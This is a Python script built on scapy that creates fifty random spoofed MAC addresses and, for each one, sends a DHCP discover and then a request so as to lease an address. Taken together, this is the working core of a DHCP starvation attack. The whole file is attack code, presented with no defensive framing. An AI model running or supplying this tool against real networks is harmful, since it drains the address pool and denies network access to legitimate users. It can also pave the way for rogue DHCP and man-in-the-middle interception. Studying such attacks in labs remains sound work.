from time import sleep
from scapy.all import *
import random
from datetime import datetime, timedelta
import subprocess

NUM_OF_MACS = 50


def get_spoofed_mac():
    # there are invalid mac, so we found that mac that starts with '34' is a valid mac
    spoofed_mac = "34:"
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        spoofed_mac += num
        if i % 2 == 1:
            spoofed_mac += ":"
    return spoofed_mac[:-1]


# returns list of spoofed macs
def get_list_of_spoofed_macs():
    res = []
    for i in range(NUM_OF_MACS):
        res.append(get_spoofed_mac())
    return res


def get_list_with_time(macs):
    # set the time to 3 minutes earlier, so that we will send for them dhcp request
    return [[mac, datetime.today() - timedelta(minutes=3)] for mac in macs]


def send_dhcp_request(mac, target_ip=None, iface=None):
    if target_ip is None:
        target_ip = "255.255.255.255"
    if iface is None:
        iface = 'eth0'

    dhcp_discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac, type=0x800) /
        IP(src="0.0.0.0", dst=target_ip) /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac, ciaddr='0.0.0.0', xid=0x01100274, flags=1) /
        DHCP(options=[("message-type", "discover"), "end"]))

    print('sending dhcp discover...\n')
    sendp(dhcp_discover, iface=iface)

    dhcp_offer = sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=5)

    if not dhcp_offer:
        return False

    print('got dhcp offer!\n')

    my_ip = dhcp_offer[BOOTP][0][3].yiaddr
    server_ip = dhcp_offer[BOOTP][0][3].siaddr
    xid = dhcp_offer[BOOTP][0][3].xid

    print('sending dhcp request...\n')
    dhcp_request = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/
        IP(src="0.0.0.0", dst="255.255.255.255")/
        UDP(sport=68, dport=67)/
        BOOTP(chaddr=mac, xid=xid)/
        DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", my_ip), "end"]))

    sleep(1)

    sendp(dhcp_request, iface=iface)
    print('dhcp request sent!\n')

    return True
